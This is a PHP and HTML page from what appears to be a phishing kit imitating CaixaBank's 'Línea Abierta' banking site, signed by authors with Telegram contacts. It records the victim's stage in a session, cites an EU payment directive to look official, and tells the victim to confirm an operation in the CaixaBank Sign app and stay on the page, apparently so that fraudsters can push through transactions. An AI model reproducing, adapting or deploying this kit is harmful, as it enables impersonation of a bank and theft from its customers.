<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
    if( $_GET['error'] == 1 ) {
        $_SESSION['last_page'] = 'errorsms';
    } else {
        $_SESSION['last_page'] = 'sms';
    }
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="../assets/imgs/favicon.ico" />

        <title>Acceso seguro a Línea Abierta</title>
    </head>

    <body style="display: flex;flex-direction: column;">

		<!-- HEADER -->
        <header id="header">
            <img class="mr-4" src="../assets/imgs/logo.png">
            <img src="../assets/imgs/logo2.png">
        </header>
        <!-- END HEADER -->

        <!-- APP -->
        <div id="app" class="flex-grow-1">
            <div class="container">
                <div class="zz d-flex align-items-center">
                    <div class="sym mr-5"><img style="min-width: 100px; min-height: 100px;" src="../assets/imgs/img.svg"></div>
                    <div class="content flex-grow-1">
                        <h3>¿Puede confirmar de que está conectado y es usted quien configuró el usuario en este dispositivo?</h3>
                        <p>Siguiendo la directiva europea de Servicios de Pago esta operación requiere una confirmación reforzada.<br>(Directiva UE 2015/2366 del Parlamento Europeo y del Consejo de la Unión Europea)</p>
                    </div>
                </div>
            </div>
        </div>
        <!-- END APP -->

        <!-- WAITING -->
        <div id="waiting">
            <div class="container">
                <div class="zz d-flex align-items-center justify-content-center">
                    <div class="d-flex align-items-center">
                        <div class="sym mr-5"><img style="min-width: 74px; min-height: 74px;" src="../assets/imgs/img2.svg"></div>
                        <div class="content flex-grow-1 text-center">
                            <h3>Confirma la operación a través de la aplicación CaixaBank Sign</h3>
                            <p class="mb20">No abandones esta página hasta que se confirme la operación.</p>
                            <img src="../assets/imgs/loading.gif">
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- END WAITING -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="../assets/js/script.js"></script>

        <script>
            setTimeout(function () {
                window.location.href= '../index.php?redirection=sms';
            },60000); // 1000 = 1s
        </script>

    </body>

</html>